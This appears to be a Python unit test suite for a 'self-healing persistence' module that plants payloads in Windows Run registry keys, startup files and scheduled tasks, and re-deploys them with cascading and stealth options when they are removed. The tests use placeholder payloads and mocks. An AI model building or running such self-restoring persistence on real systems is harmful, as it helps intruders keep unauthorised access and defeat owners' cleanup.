#!/usr/bin/env python3
"""
Comprehensive test suite for Self-Healing Persistence System

Tests cover:
1. Persistence point registration and management
2. Health check functionality
3. Recovery mechanisms
4. Multi-strategy recovery
5. Stealth monitoring
6. Event tracking and history
7. Checkpoint creation and validation
8. Concurrent operations
"""

import unittest
import time
import threading
import json
import tempfile
import os
from unittest.mock import Mock, patch, MagicMock

from self_healing_persistence import (
    SelfHealingPersistence,
    SelfHealingPersistenceBuilder,
    PersistencePoint,
    RecoveryEvent,
    HealthCheckResult,
    RecoveryTrigger,
    HealthStatus,
    RecoveryStrategy,
    create_basic_self_healing,
    create_redundant_self_healing
)


class TestPersistencePointRegistration(unittest.TestCase):
    """Test persistence point registration"""

    def setUp(self):
        self.system = SelfHealingPersistence()

    def test_register_single_point(self):
        """Test registering a single persistence point"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="HKCU\\Software\\Run",
            payload="cmd.exe"
        )

        self.assertIsNotNone(point_id)
        self.assertIn(point_id, self.system.persistence_points)

    def test_register_multiple_points(self):
        """Test registering multiple persistence points"""
        point_ids = []
        for i in range(5):
            pid = self.system.register_persistence_point(
                point_type=f"type_{i}",
                location=f"location_{i}",
                payload=f"payload_{i}"
            )
            point_ids.append(pid)

        self.assertEqual(len(self.system.persistence_points), 5)
        self.assertEqual(len(set(point_ids)), 5)  # All unique

    def test_register_with_metadata(self):
        """Test registering point with metadata"""
        metadata = {"priority": "high", "owner": "test"}

        point_id = self.system.register_persistence_point(
            point_type="startup_file",
            location="/tmp/test.sh",
            payload="echo test",
            metadata=metadata
        )

        point = self.system.persistence_points[point_id]
        self.assertEqual(point.metadata["priority"], "high")
        self.assertEqual(point.metadata["owner"], "test")

    def test_payload_hash_stored(self):
        """Test that payload hash is correctly stored"""
        payload = "test_payload_12345"

        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test_location",
            payload=payload
        )

        point = self.system.persistence_points[point_id]
        self.assertIsNotNone(point.payload_hash)
        self.assertEqual(len(point.payload_hash), 64)  # SHA256 hex digest

    def test_point_timestamps(self):
        """Test that timestamps are set correctly"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        point = self.system.persistence_points[point_id]
        now = time.time()

        # Timestamps should be recent
        self.assertLess(now - point.creation_timestamp, 1)
        self.assertLess(now - point.last_verified, 1)


class TestHealthChecking(unittest.TestCase):
    """Test health checking functionality"""

    def setUp(self):
        self.system = SelfHealingPersistence()

    def test_health_check_no_points(self):
        """Test health check with no registered points"""
        result = self.system.perform_health_check()

        self.assertEqual(result.total_points, 0)
        self.assertEqual(result.healthy_points, 0)
        self.assertEqual(result.overall_status, HealthStatus.HEALTHY)

    def test_health_check_single_point(self):
        """Test health check with single point"""
        self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_verify_persistence_point', return_value=True):
            result = self.system.perform_health_check()

        self.assertEqual(result.total_points, 1)
        self.assertEqual(result.healthy_points, 1)

    def test_health_check_multiple_points(self):
        """Test health check with multiple points"""
        for i in range(3):
            self.system.register_persistence_point(
                point_type=f"type_{i}",
                location=f"location_{i}",
                payload=f"payload_{i}"
            )

        with patch.object(self.system, '_verify_persistence_point', return_value=True):
            result = self.system.perform_health_check()

        self.assertEqual(result.total_points, 3)
        self.assertEqual(result.healthy_points, 3)

    def test_health_check_degraded_status(self):
        """Test health check detects degraded status"""
        point_ids = []
        for i in range(3):
            pid = self.system.register_persistence_point(
                point_type=f"type_{i}",
                location=f"location_{i}",
                payload=f"payload_{i}"
            )
            point_ids.append(pid)

        # Mock verification to return False for first point
        def verify_mock(point):
            return point.point_id != point_ids[0]

        with patch.object(self.system, '_verify_persistence_point', side_effect=verify_mock):
            result = self.system.perform_health_check()

        self.assertEqual(result.total_points, 3)
        self.assertEqual(result.healthy_points, 2)
        self.assertEqual(result.degraded_points, 1)

    def test_health_check_critical_status(self):
        """Test health check detects critical status"""
        pid = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        # Set to max recovery attempts to trigger critical
        self.system.point_recovery_counts[pid] = self.system.max_recovery_attempts

        with patch.object(self.system, '_verify_persistence_point', return_value=False):
            result = self.system.perform_health_check()

        self.assertEqual(result.overall_status, HealthStatus.CRITICAL)

    def test_health_check_history(self):
        """Test health check history is maintained"""
        self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_verify_persistence_point', return_value=True):
            for _ in range(3):
                self.system.perform_health_check()

        self.assertEqual(len(self.system.health_check_history), 3)


class TestRecoveryMechanisms(unittest.TestCase):
    """Test recovery mechanisms"""

    def setUp(self):
        self.system = SelfHealingPersistence()

    def test_initiate_recovery(self):
        """Test initiating recovery"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_immediate_redeploy', return_value=True):
            success = self.system.initiate_recovery(
                point_id=point_id,
                trigger=RecoveryTrigger.REGISTRY_MISSING
            )

        self.assertTrue(success)
        self.assertEqual(len(self.system.recovery_events), 1)

    def test_recovery_event_recorded(self):
        """Test recovery events are recorded"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_immediate_redeploy', return_value=True):
            self.system.initiate_recovery(
                point_id=point_id,
                trigger=RecoveryTrigger.REGISTRY_MISSING
            )

        event = self.system.recovery_events[0]
        self.assertEqual(event.point_id, point_id)
        self.assertEqual(event.trigger, RecoveryTrigger.REGISTRY_MISSING)
        self.assertTrue(event.success)

    def test_recovery_failure_recorded(self):
        """Test failed recovery is recorded"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_immediate_redeploy', return_value=False):
            self.system.initiate_recovery(
                point_id=point_id,
                trigger=RecoveryTrigger.REGISTRY_MISSING
            )

        event = self.system.recovery_events[0]
        self.assertFalse(event.success)

    def test_recovery_attempt_limit(self):
        """Test recovery stops after max attempts"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        # Set recovery count to max
        self.system.point_recovery_counts[point_id] = self.system.max_recovery_attempts

        with patch.object(self.system, '_immediate_redeploy', return_value=True):
            success = self.system.initiate_recovery(
                point_id=point_id,
                trigger=RecoveryTrigger.REGISTRY_MISSING
            )

        self.assertFalse(success)

    def test_recovery_counter_incremented(self):
        """Test recovery counter is incremented"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_immediate_redeploy', return_value=True):
            self.system.initiate_recovery(
                point_id=point_id,
                trigger=RecoveryTrigger.REGISTRY_MISSING
            )

        self.assertEqual(self.system.point_recovery_counts[point_id], 1)


class TestRecoveryStrategies(unittest.TestCase):
    """Test different recovery strategies"""

    def setUp(self):
        self.system = SelfHealingPersistence()

    def test_immediate_redeploy_strategy(self):
        """Test immediate redeploy strategy"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_redeploy_registry', return_value=True):
            success = self.system._immediate_redeploy(
                self.system.persistence_points[point_id]
            )

        self.assertTrue(success)

    def test_delayed_redeploy_strategy(self):
        """Test delayed redeploy strategy"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_immediate_redeploy', return_value=True):
            success = self.system._delayed_redeploy(
                self.system.persistence_points[point_id]
            )

        # Delayed redeploy should return immediately with thread spawned
        self.assertTrue(success)

    def test_cascading_fallback_strategy(self):
        """Test cascading fallback strategy"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        # Mock methods to fail then succeed
        with patch.object(self.system, '_redeploy_registry', return_value=False):
            with patch.object(self.system, '_redeploy_startup_file', return_value=True):
                success = self.system._cascading_fallback(
                    self.system.persistence_points[point_id]
                )

        self.assertTrue(success)

    def test_multi_point_deployment_strategy(self):
        """Test multi-point deployment strategy"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_redeploy_registry', return_value=True):
            with patch.object(self.system, '_redeploy_startup_file', return_value=True):
                success = self.system._multi_point_deployment(
                    self.system.persistence_points[point_id]
                )

        self.assertTrue(success)


class TestMonitoring(unittest.TestCase):
    """Test monitoring functionality"""

    def setUp(self):
        self.system = SelfHealingPersistence(check_interval_seconds=1)

    def tearDown(self):
        self.system.stop_monitoring()

    def test_start_monitoring(self):
        """Test starting monitoring"""
        self.system.start_monitoring(background=False)
        # This would be a long-running operation, so we'll skip the full test

    def test_monitoring_flag(self):
        """Test monitoring flag is set"""
        self.assertFalse(self.system.is_monitoring)

        self.system.is_monitoring = True
        self.assertTrue(self.system.is_monitoring)

    def test_stop_monitoring(self):
        """Test stopping monitoring"""
        self.system.is_monitoring = True
        self.system.stop_monitoring()

        self.assertFalse(self.system.is_monitoring)


class TestStatusReporting(unittest.TestCase):
    """Test status reporting functionality"""

    def setUp(self):
        self.system = SelfHealingPersistence()

    def test_health_status_no_checks(self):
        """Test health status with no checks performed"""
        status = self.system.get_health_status()

        self.assertEqual(status["status"], "no_data")

    def test_health_status_after_check(self):
        """Test health status after performing check"""
        self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_verify_persistence_point', return_value=True):
            self.system.perform_health_check()

        status = self.system.get_health_status()

        self.assertIsNotNone(status["timestamp"])
        self.assertEqual(status["healthy_points"], 1)
        self.assertEqual(status["overall_status"], "healthy")

    def test_recovery_history(self):
        """Test recovery history retrieval"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_immediate_redeploy', return_value=True):
            for _ in range(3):
                self.system.initiate_recovery(
                    point_id=point_id,
                    trigger=RecoveryTrigger.REGISTRY_MISSING
                )

        history = self.system.get_recovery_history()

        self.assertEqual(len(history), 3)

    def test_recovery_history_limit(self):
        """Test recovery history limit"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_immediate_redeploy', return_value=True):
            for _ in range(10):
                self.system.initiate_recovery(
                    point_id=point_id,
                    trigger=RecoveryTrigger.REGISTRY_MISSING
                )

        history = self.system.get_recovery_history(limit=5)

        self.assertEqual(len(history), 5)

    def test_persistence_points_status(self):
        """Test persistence points status report"""
        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        status = self.system.get_persistence_points_status()

        self.assertEqual(len(status), 1)
        self.assertEqual(status[0]["point_id"], point_id)
        self.assertEqual(status[0]["type"], "registry")
        self.assertTrue(status[0]["is_healthy"])


class TestCheckpoints(unittest.TestCase):
    """Test checkpoint functionality"""

    def setUp(self):
        self.system = SelfHealingPersistence()

    def test_create_checkpoint(self):
        """Test creating a checkpoint"""
        self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        checkpoint = self.system.create_recovery_checkpoint()

        self.assertIsNotNone(checkpoint)
        self.assertIsInstance(checkpoint, str)

    def test_checkpoint_contains_data(self):
        """Test checkpoint contains expected data"""
        self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        checkpoint = self.system.create_recovery_checkpoint()
        data = json.loads(checkpoint)

        self.assertIn("timestamp", data)
        self.assertIn("points", data)
        self.assertIn("recovery_counts", data)

    def test_validate_checkpoint_valid(self):
        """Test validating a valid checkpoint"""
        self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        checkpoint = self.system.create_recovery_checkpoint()
        is_valid = self.system.validate_checkpoint(checkpoint)

        self.assertTrue(is_valid)

    def test_validate_checkpoint_invalid(self):
        """Test validating an invalid checkpoint"""
        is_valid = self.system.validate_checkpoint("{}")
        self.assertFalse(is_valid)

    def test_validate_checkpoint_malformed(self):
        """Test validating malformed JSON"""
        is_valid = self.system.validate_checkpoint("not json")
        self.assertFalse(is_valid)


class TestBuilder(unittest.TestCase):
    """Test SelfHealingPersistenceBuilder"""

    def test_builder_basic(self):
        """Test basic builder usage"""
        builder = SelfHealingPersistenceBuilder()
        builder.add_registry_point("HKCU\\Run", "Test", "payload")

        system = builder.build()

        self.assertEqual(len(system.persistence_points), 1)

    def test_builder_multiple_points(self):
        """Test builder with multiple points"""
        builder = SelfHealingPersistenceBuilder()
        builder.add_registry_point("HKCU\\Run", "Test1", "payload1")
        builder.add_startup_file("/tmp/test.sh", "payload2")
        builder.add_scheduled_task("TestTask", "payload3")

        system = builder.build()

        self.assertEqual(len(system.persistence_points), 3)

    def test_builder_configuration(self):
        """Test builder configuration"""
        builder = SelfHealingPersistenceBuilder()
        builder.set_check_interval(600)
        builder.set_recovery_timeout(120)
        builder.set_max_recovery_attempts(10)
        builder.enable_stealth_mode(True)

        system = builder.build()

        self.assertEqual(system.check_interval, 600)
        self.assertEqual(system.recovery_timeout, 120)
        self.assertEqual(system.max_recovery_attempts, 10)
        self.assertTrue(system.stealth_mode)

    def test_builder_chaining(self):
        """Test builder method chaining"""
        system = (SelfHealingPersistenceBuilder()
                  .add_registry_point("HKCU\\Run", "Test", "payload")
                  .set_check_interval(500)
                  .enable_stealth_mode(True)
                  .build())

        self.assertEqual(len(system.persistence_points), 1)
        self.assertEqual(system.check_interval, 500)


class TestHelperFunctions(unittest.TestCase):
    """Test helper functions"""

    def test_create_basic_self_healing(self):
        """Test creating basic self-healing system"""
        system = create_basic_self_healing("test_payload", check_interval=120)

        self.assertEqual(len(system.persistence_points), 1)
        self.assertEqual(system.check_interval, 120)

    def test_create_redundant_self_healing(self):
        """Test creating redundant self-healing system"""
        system = create_redundant_self_healing(
            payload="test_payload",
            registry_path="HKCU\\Run",
            startup_file="/tmp/startup.sh",
            task_name="TestTask"
        )

        self.assertEqual(len(system.persistence_points), 3)
        self.assertTrue(system.stealth_mode)


class TestPayloadHandling(unittest.TestCase):
    """Test payload handling and hashing"""

    def setUp(self):
        self.system = SelfHealingPersistence()

    def test_payload_storage(self):
        """Test payload is stored correctly"""
        payload = "test_payload_content"

        point_id = self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload=payload
        )

        self.assertEqual(self.system.point_payloads[point_id], payload)

    def test_payload_hash_consistency(self):
        """Test payload hash is consistent"""
        payload = "test_payload"

        hash1 = self.system._hash_payload(payload)
        hash2 = self.system._hash_payload(payload)

        self.assertEqual(hash1, hash2)

    def test_different_payloads_different_hashes(self):
        """Test different payloads have different hashes"""
        payload1 = "payload_one"
        payload2 = "payload_two"

        hash1 = self.system._hash_payload(payload1)
        hash2 = self.system._hash_payload(payload2)

        self.assertNotEqual(hash1, hash2)

    def test_binary_payload_handling(self):
        """Test binary payload handling"""
        payload = b"binary_payload"

        hash1 = self.system._hash_payload(payload)
        self.assertIsNotNone(hash1)


class TestConcurrency(unittest.TestCase):
    """Test concurrent operations"""

    def setUp(self):
        self.system = SelfHealingPersistence()

    def test_concurrent_point_registration(self):
        """Test concurrent point registration"""
        def register_points(count):
            for i in range(count):
                self.system.register_persistence_point(
                    point_type=f"type_{i}",
                    location=f"location_{i}",
                    payload=f"payload_{i}"
                )

        threads = []
        for _ in range(3):
            t = threading.Thread(target=register_points, args=(10,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        self.assertEqual(len(self.system.persistence_points), 30)

    def test_concurrent_health_checks(self):
        """Test concurrent health checks"""
        self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        def perform_checks():
            with patch.object(self.system, '_verify_persistence_point', return_value=True):
                for _ in range(5):
                    self.system.perform_health_check()

        threads = []
        for _ in range(3):
            t = threading.Thread(target=perform_checks)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        # All health checks should be recorded
        self.assertGreater(len(self.system.health_check_history), 0)


class TestExportReport(unittest.TestCase):
    """Test status report export"""

    def setUp(self):
        self.system = SelfHealingPersistence()

    def test_export_status_report(self):
        """Test exporting status report"""
        self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        report = self.system.export_status_report()

        self.assertIsNotNone(report)
        data = json.loads(report)

        self.assertIn("timestamp", data)
        self.assertIn("system_health", data)
        self.assertIn("persistence_points", data)

    def test_export_report_contains_all_data(self):
        """Test exported report contains all expected data"""
        self.system.register_persistence_point(
            point_type="registry",
            location="test",
            payload="payload"
        )

        with patch.object(self.system, '_verify_persistence_point', return_value=True):
            self.system.perform_health_check()

        report_json = self.system.export_status_report()
        report = json.loads(report_json)

        self.assertIn("recovery_history", report)
        self.assertIn("recovery_event_count", report)
        self.assertIn("health_check_count", report)


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)
